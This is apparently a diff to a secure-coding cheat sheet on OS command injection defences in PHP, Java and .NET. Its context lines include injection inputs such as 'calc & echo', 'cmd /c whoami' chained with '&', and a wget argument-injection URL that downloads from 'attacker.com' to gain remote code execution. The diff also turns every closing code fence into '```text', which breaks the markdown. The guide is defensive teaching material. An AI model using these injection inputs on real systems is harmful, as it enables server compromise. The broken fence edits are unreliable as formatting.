@@ -20,17 +20,17 @@ Command injection (or OS Command Injection) is a type of injection where softwar
 
 For example, if the supplied value is:
 
-``` shell
+```bash
 calc
-```
+```text
 
 when typed in a Windows command prompt, the application *Calculator* is displayed.
 
 However, if the supplied value has been tampered with, and now it is:
 
-``` shell
+```bash
 calc & echo "test"
-```
+```text
 
 when executed, it changes the meaning of the initial intended value.
 
@@ -49,7 +49,7 @@ For example, if the user input is passed through an escape function to escape ce
 ```php
 
 system("curl " . escape($url));
-```
+```text
 
 which will prevent an attacker to run other commands.
 
@@ -58,7 +58,7 @@ However, if the attacker controlled string contains an additional argument of th
 ```php
 
 system("curl " . escape("--help"))
-```
+```text
 
 Now when the above code is executed, it will show the output of `curl --help`.
 
@@ -106,7 +106,7 @@ If calling a system command that incorporates user-supplied cannot be avoided, t
 
 ```text
 & |  ; $ > < ` \ ! ' " ( )
-```
+```text
 
 ## Additional Defenses
 
@@ -135,7 +135,7 @@ The key difference is that much of the functionality provided by the shell that 
 
 *Code to test the note above:*
 
-``` java
+```java
 String[] specialChars = new String[]{"&", "&&", "|", "||"};
 String payload = "cmd /c whoami";
 String cmdTemplate = "java -version %s " + payload;
@@ -161,7 +161,7 @@ System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                   "utf-8"));
 System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                   "utf-8"));
-```
+```text
 
 *Result of the test:*
 
@@ -200,13 +200,13 @@ OUT   :
 mydomain\simpleuser
 
 ERROR :
-```
+```text
 
 *Incorrect usage:*
 
 ```java
 ProcessBuilder b = new ProcessBuilder("C:\DoStuff.exe -arg1 -arg2");
-```
+```text
 
 In this example, the command together with the arguments are passed as a one string, making it easy to manipulate that expression and inject malicious strings.
 
@@ -214,7 +214,7 @@ In this example, the command together with the arguments are passed as a one str
 
 Here is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This makes it easy to validate each term and reduces the risk of malicious strings being inserted.
 
-``` java
+```java
 ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");
 
 Map<String, String> env = pb.environment();
@@ -222,7 +222,7 @@ Map<String, String> env = pb.environment();
 pb.directory(new File("TrustedDir"));
 
 Process p = pb.start();
-```
+```text
 
 ### .Net
 
@@ -244,13 +244,13 @@ For example, consider this code using `wget` with `escapeshellcmd()`:
 $url = $_GET['url'];
 $command = 'wget --directory-prefix=..\temp ' . $url;
 system(escapeshellcmd($command));
-```
+```text
 
 If the user provides:
 
 ```text
 http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
-```
+```text
 
 `escapeshellcmd()` will still allow this extra parameter meaning the attacker can override the original `--directory-prefix` option, save the file in the current directory and then achieve remote command execution on the server.
 
@@ -260,7 +260,7 @@ The safe approach is to use `escapeshellarg()` so that the URL is treated as a s
 $url = $_GET['url'];
 $command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
 system($command);
-```
+```text
 
 Now the malicious input becomes:
 
